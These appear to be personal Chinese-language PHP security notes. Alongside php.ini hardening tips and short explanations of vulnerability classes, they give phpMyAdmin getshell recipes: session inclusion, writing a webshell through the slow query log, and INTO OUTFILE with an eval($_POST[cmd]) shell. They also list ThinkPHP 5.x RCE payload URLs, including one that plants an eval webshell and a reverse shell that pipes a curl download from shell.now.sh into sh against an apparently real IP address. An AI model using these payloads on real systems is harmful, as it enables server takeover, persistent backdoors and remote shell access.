## php.ini
php.ini并放置在httpd.conf中PHPIniDir指定的目录，使用phpinfo()函数可以查看

```ini
safe_mode = off 避免各种奇怪的失败
register_globals 关闭
open_basedir 配置， 防止目录遍历
allow_url_fopen 关闭 文件打开限制
display_error =off 避免攻击者获取更多信息
expose_php = off 隐藏版本信息
```

## 代码审计练习
https://github.com/hongriSec/PHP-Audit-Labs

两款代码审计工具 seay ,RIPS



## phpmyadmin 密码修改
1. 更改用户中的密码
2. `config.inc.php`中password修改

## 序列化和反序列化

CVE-2016-7124

## 变量覆盖漏洞
　　变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击 变量覆盖漏洞大多数由函数使用不当导致，经常引发变量覆盖漏洞的函数有：extract(),parse_str()和import_request_variables()

## RCE(远程代码执行)
命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。
```php
System() //有回显
exec() //无回显
shell_exec() //无回显
passthru() //有回显
```

### ereg()
出现%00 则只检查%00前面的字符串
### preg_replace()
正则表达式替换，第一个参数/e结束时，会将第二个参数当成代码执行

### 序列化与反序列化
unserialize 会调用__wakeup 函数

### assert()

当第一参数是字符串时，执行字符串代码


## php7 直接崩溃bug
`include(‘php://filter/string.strip_tags/resource=/etc/passwd’)`
## phar
TODO:
https://blog.csdn.net/ru_li/article/details/51452488
http://www.vuln.cn/2035
http://www.webhek.com/post/packaging-your-php-apps-with-phar.html
## phpmyadmin
### 本地session包含
1. root登录，执行 `select '<?php phpinfo();exit;?>'`
2. 找到phpmyadmin cookie，`/index.php?target=db_sql.php%253f/../../var/lib/php/sessions/<you cookie>`

### 文件包含getshell

获取web绝对路径(`select @@basedir;`)

### 日志getshell
```sql
set global slow_query_log=1; --开启慢查询日志
show global variables like '%long_query_time%'
# 默认10秒

set global slow_query_log_file='dir\filename';
select '<?php phpinfo();?>' or sleep(11);
```
### 文件写入shell
方法一：
```sql
SHOW VARIABLES LIKE '%secure_file_priv%'; 
# 结果为null时无法写入文件
select '<?php @eval_r($_POST[cmd])?>'INTO OUTFILE '网站目录路径/eval.php'
```
方法二：
1. test数据库下新建表，字段名`<?php phpinfo()?>`
2. 查看sql文件路径`show variables like '%datadir%'`
3. getshell `/index.php?target=db_sql.php%253f/../../var/lib/mysql/test/hy.frm`


## think php5.x RCE

```
https://learnku.com/articles/21227  
范围： 5.x < 5.1.31, <= 5.0.23  
补丁：https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f  
https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815  
payload: 
http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php

http://localhost:9096/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php echo 'ok';?>
shell反弹：
http://121.12.172.119:30022//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=curl+https%3A%2F%2Fshell.now.sh%2F154.223.145.173%3A1337+%7C+sh
```